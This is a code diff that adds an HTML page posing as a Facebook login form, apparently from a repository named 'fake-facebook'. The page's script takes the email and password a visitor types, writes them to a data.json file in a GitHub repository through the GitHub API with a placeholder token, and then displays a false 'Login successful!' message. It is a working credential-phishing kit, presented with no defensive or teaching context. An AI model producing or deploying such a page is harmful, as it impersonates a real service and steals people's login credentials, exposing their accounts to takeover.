@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        .login-container { width: 300px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; }
+        .login-container h2 { text-align: center; }
+        .login-container input { width: 100%; padding: 10px; margin: 10px 0; }
+        .login-container button { width: 100%; padding: 10px; background-color: #1877f2; color: white; border: none; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Facebook</h2>
+        <form id="loginForm">
+            <input type="text" id="email" placeholder="Email or Phone" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            fetch('https://api.github.com/repos/your-username/fake-facebook/contents/data.json', {
+                method: 'GET',
+                headers: {
+                    'Accept': 'application/vnd.github.v3+json'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                const content = atob(data.content);
+                const jsonData = JSON.parse(content);
+                jsonData.push({ email, password });
+                const newContent = btoa(JSON.stringify(jsonData));
+
+                fetch('https://api.github.com/repos/your-username/fake-facebook/contents/data.json', {
+                    method: 'PUT',
+                    headers: {
+                        'Accept': 'application/vnd.github.v3+json',
+                        'Authorization': 'token YOUR_GITHUB_TOKEN'
+                    },
+                    body: JSON.stringify({
+                        message: 'Update data',
+                        content: newContent,
+                        sha: data.sha
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    alert('Login successful!');
+                });
+            });
+        });
+    </script>
+</body>
+</html>
